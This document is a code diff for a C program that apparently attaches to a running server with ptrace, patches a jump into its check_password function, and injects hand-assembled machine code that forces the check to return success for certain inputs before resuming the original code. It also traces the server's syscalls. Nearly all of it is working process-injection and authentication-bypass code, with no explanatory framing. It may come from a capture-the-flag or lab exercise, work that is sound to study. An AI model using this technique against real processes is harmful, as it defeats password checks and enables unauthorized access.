@@ -103,7 +103,7 @@ void print_mem_at(int server_pid, unsigned long long location, int count)
     for (int i = 0; i < count; i++) {
         long word = ptrace(PTRACE_PEEKDATA, server_pid, location + (i * WORD_SIZE), 0);
         word = htobe64(word); // Big endian so it prints in the same order as objdump.
-        printf("%lx", word);
+        printf("%016lx", word);
     }
     printf("\n-- END Code --\n");
 }
@@ -174,8 +174,72 @@ unsigned long long mmap_me(int server_pid, unsigned long long where)
     return ret_value;
 }
 
-void write_jump_code()
+void write_jump_code(int server_pid, unsigned long long func_location, unsigned long long jump_location)
 {
+    /*
+     * we're replacing "415741564154534881ec480100004889"
+     * The last instruction is cut in half, so we preserve the first 2 bytes of it,
+     * and we need to jump back to `func_location + 13`, to pop rax and continue
+     * */
+
+    /*
+     * this is:
+     * push rax
+     * movabs rax, `jump_location`
+     * jmp rax
+     * pop rax
+     *
+     * .byte 48
+     * .byte 89
+     * */
+    unsigned long jump_code[2];
+    jump_code[0] = 0xb84850 | jump_location << (8 * 3);
+    jump_code[1] = jump_location >> (8 * 5) | 0x894858e0ffull << (8 * 3);
+    printf("jump code 0 : %lx\n", htobe64(jump_code[0]));
+    printf("jump code 1 : %lx\n", htobe64(jump_code[1]));
+
+    write_words_at(server_pid, func_location, 2, jump_code);
+}
+
+void write_my_code(int server_pid, unsigned long long location, unsigned long long jump_back_location)
+{
+    /*
+     * Code means:
+        cmp rsi, 6
+        jne $+0xb   ; to the nop
+        pop rax     ; pop because we pushed it earlier to save it. don't wanna jump there
+        mov rax, 1
+        ret
+        nop
+
+     * and then:
+     * Stuff we wrote over for the jump
+     * and then:
+     * mov rax, `jump_back_location`,
+     * jmp rax
+     * */
+    unsigned long my_code[] = {
+        be64toh(0x4883FE0675095848),
+        be64toh(0xC7C001000000C390),
+        be64toh(0x4157415641545348),
+        be64toh(0x81ec480100009090),
+        0,
+        0
+    };
+#define MY_CODE_LEN sizeof(my_code) / sizeof(unsigned long)
+
+    my_code[MY_CODE_LEN - 2] = 0xb848 | jump_back_location << (8 * 2);
+    my_code[MY_CODE_LEN - 1] = jump_back_location >> (8 * 6) | 0xe0ffull << (8 * 2);
+
+    write_words_at(server_pid, location, MY_CODE_LEN, my_code);
+}
+
+void wait_upon_rip(int server_pid, unsigned long long goal)
+{
+    while (get_rip(server_pid) != goal) {
+        ptrace(PTRACE_SINGLESTEP, server_pid, 0, 0);
+        waitpid(server_pid, 0, __WALL);
+    }
 }
 
 int main(int argc, char *argv[])
@@ -195,9 +259,41 @@ int main(int argc, char *argv[])
 
     unsigned long long func_location = get_check_password_location(server_pid);
     printf("check_password location: %llx\n", func_location);
-    print_mem_at(server_pid, func_location, 100);
 
-    ptrace(PTRACE_CONT, server_pid, 0, 0);
+    printf("writing jump to %llx at %llx...\n", mmap_location, func_location);
+    write_jump_code(server_pid, func_location, mmap_location);
+
+    write_my_code(server_pid, mmap_location, func_location + 13);
+
+    print_mem_at(server_pid, func_location, 20);
+    print_mem_at(server_pid, mmap_location, 20);
+    ptrace(PTRACE_SYSCALL, server_pid, 0, 0);
+
+    while (1) {
+        int status;
+        waitpid(server_pid, &status, __WALL);
+        if (!WIFSTOPPED(status)) {
+            // Not really stopped?
+            ptrace(PTRACE_SYSCALL, server_pid, 0, 0);
+            continue;
+        }
+        if (!(WSTOPSIG(status) == (SIGTRAP | 0x80) || WSTOPSIG(status) == SIGTRAP)) {
+            // Not a syscall.
+            ptrace(PTRACE_SYSCALL, server_pid, 0, 0);
+            continue;
+        }
+        struct ptrace_syscall_info info;
+        memset(&info, 0, sizeof(info));
+        int syscall_get_res = ptrace(PTRACE_GET_SYSCALL_INFO, server_pid, sizeof(info), &info);
+        if (info.op == PTRACE_SYSCALL_INFO_ENTRY) {
+            // Entry into syscall
+            printf("syscall entry, number: %lld\n", info.entry.nr);
+            if (info.entry.nr == 201) {
+                printf("got a time() call, rip: %llx\n", get_rip(server_pid));
+            }
+        }
+        ptrace(PTRACE_SYSCALL, server_pid, 0, 0);
+    }
     return 0;
 
     unsigned int check_password_code_offset = 0x82cf0;
